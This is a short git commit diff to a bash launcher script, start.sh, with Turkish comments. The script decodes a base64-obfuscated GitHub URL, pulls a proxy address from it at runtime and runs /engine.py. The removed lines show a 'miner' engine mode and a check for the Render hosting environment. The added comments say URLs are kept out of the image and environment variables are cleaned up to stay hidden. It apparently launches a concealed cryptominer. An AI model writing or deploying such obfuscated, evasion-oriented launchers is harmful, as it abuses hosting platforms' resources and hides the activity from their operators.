d3643f428616f8f159b873afffef2b0e273dd8fd
Exma0 <oztoprakyilmazcan@gmail.com>
2026-03-17 11:26:22 -0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,18 +1,9 @@
 #!/bin/bash
-# Network Management Node
 
-# GitHub'dan Proxy URL'sini çöz [cite: 1]
+# Hassas URL'leri GitHub'dan çek (İmaj içinde URL bırakma) [cite: 1]
 CONF_U="$(echo 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0V4bWEwL3djL3JlZnMvaGVhZHMvbWFpbi91cmw=' | base64 -d)"
 DYN_URL=$(curl -sL "$CONF_U" | tr -d '\n\r\t ')
 
 export PROXY_URL="${DYN_URL}"
-
-# Render ortamı kontrolü
-if [[ -n "${RENDER_EXTERNAL_HOSTNAME}" ]]; then
-    export ENGINE_MODE="all"
-else
-    export ENGINE_MODE="miner"
-fi
-
-export PYTHONUNBUFFERED=1
+# Ortam değişkenlerini gizlemek için script bittiğinde temizlik yapacak olan Python'u çağır
 exec python3 /engine.py
